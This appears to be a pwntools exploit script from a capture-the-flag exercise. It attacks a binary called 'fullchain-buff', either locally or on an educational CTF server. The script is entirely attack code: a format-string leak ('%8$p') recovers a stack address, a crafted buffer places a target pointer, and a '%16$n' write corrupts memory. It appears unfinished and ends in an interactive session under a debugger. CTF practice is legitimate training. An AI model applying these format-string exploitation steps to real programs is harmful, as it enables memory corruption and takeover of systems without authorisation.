#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30205)
else:
    r = process('./fullchain-buff')

elf = ELF('./fullchain-buff')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
# r.sendlineafter('global or local > ', b'local')
# r.sendlineafter('read or write > ', b'write%23$p')
# libc_base = int(r.recv(19)[5:], 16) - libc.sym['__libc_start_main'] - 243
# print(hex(libc_base))

# r.sendlineafter('global or local > ', b'local')
# r.sendlineafter('read or write > ', b'write%23$p')

# print(hex(exit))

r.sendlineafter('global or local > ', b'local')
r.sendlineafter('read or write > ', b'write%8$p')
stack_base = int(r.recv(19)[5:], 16)
print(f'stack_base: {hex(stack_base)}')

r.sendlineafter('global or local > ', b'local')
r.sendlineafter('read or write > ', b'read')
r.sendlineafter('length > ', b'23')
r.sendline(b'A'*8 + p64(stack_base - 0x58))

gdb.attach(r)
r.sendlineafter('global or local > ', b'local')
r.sendafter('read or write > ', b'write%16$n')

r.interactive()
